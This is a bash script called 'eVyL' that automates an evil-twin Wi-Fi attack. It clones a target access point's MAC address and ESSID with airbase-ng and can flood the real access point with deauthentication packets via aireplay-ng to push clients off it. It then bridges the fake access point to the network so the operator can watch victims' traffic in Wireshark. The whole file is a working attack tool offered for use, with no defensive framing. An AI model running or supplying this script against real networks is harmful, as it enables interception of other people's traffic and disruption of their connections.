#!/bin/bash

echo "     ______________________  ____________________________"&&echo "    /   ___/  /  _/  _/  _/ /__   __/  /   _/  _/    / _/"&&echo "   /   /_ /  /  //  //  /     /  / /  /   //  //    / / "&&echo "  /   __//  /  //  //  /     /  / /  /   //  //      /   "&&echo " /   /__/     //  //  /__   /  /_/      //  //  /   /"&&echo "/____________//__//_____/  /_______/___//__//__/___/     "
echo ""
echo "________________________________________________________"&&echo
echo "	               Welcome to eVyL"&&echo
echo "________________________________________________________"

echo&&scriptName=$HOME/Documents/unix_scripts/evyl.sh
sleep 3
echo "Created on 01/08/2017 by Marc Pascual i Solé. Mail me at mpasole@protonmail.com"
sleep 1.3
echo "Last Modification:" $(stat $scriptName | grep Modify | gawk '{ FS = " " } {print $2}')
sleep 0.3
sleep 0.5
echo "This program clones an Access Point's MAC Address "
sleep 0.5

#######################
###### USER INPUT #####
#######################
echo
# --- ACCESS POINT -------
echo -n "[*] Access Point (Gateway) Address: "
read apMac
sleep 0.3

#----- AP ESSID ----------
echo -n "[*] AP ESSID: "
read essid
sleep 0.3

#----- CHANNEL ----------
echo -n "[*] CHANNEL of the Acces Point: "
read channel
sleep 0.3

echo -n "[*] Network Interface: "
read interface
sleep 0.3

echo -n "[*] Name of the AIRBASE interface (It can be any name): "
read bridgeIfName
sleep 0.3
echo



########################
####### NET BRIDGE #####
########################

echo
sleep 3

echo "[+] Opening XTERM Console"
sleep 2
sudo xterm -hold -e "airbase-ng -a $apMac --essid $essid -c $channel $interface" & 
sleep 4&&echo -n "[*] DEAUTH Access Point $essid ?[Y/n]: "
read b

#DEAUTH
case $b in
        "Y"|"y")
		echo -n "[*] How many DEAUTH-PACKETS?: "&& read NUM &&echo
		sleep 2
		echo "[+] Opening XTERM Console"
                sudo xterm -hold -e "aireplay-ng -0 $NUM -a $apMac $interface" &
		;;
esac
sleep 5&&echo&&echo "[+] BRIDGING interfaces with Bridge-utils..."

brctl addbr $bridgeIfName
echo "[+] $bridgeIfName Inteface added..."

airbaseIfName="at0"

brctl addif $bridgeIfName $interface
echo "[+] $interface BRIDGED with $bridgeIfName"&&sleep 3
brctl addif $bridgeIfName $airbaseIfName
echo "[+] $airbaseIfName BRIDGED with $bridgeIfName"&&sleep 3&&echo "[+] Bridged Interfaces UP"
ifconfig $airbaseIfName 0.0.0.0 up
sleep 0.4
ifconfig $bridgeIfName up
sleep 0.4
dhclient $bridgeIfName
sleep 3


echo&&sleep 2&&echo "Done. :)"&&sleep 1
echo "You have created $essid""s EVIL TWIN xD"&&sleep 2&&echo "You can now monitor traffic with WireShark"&&sleep 2
echo "Exitting..."
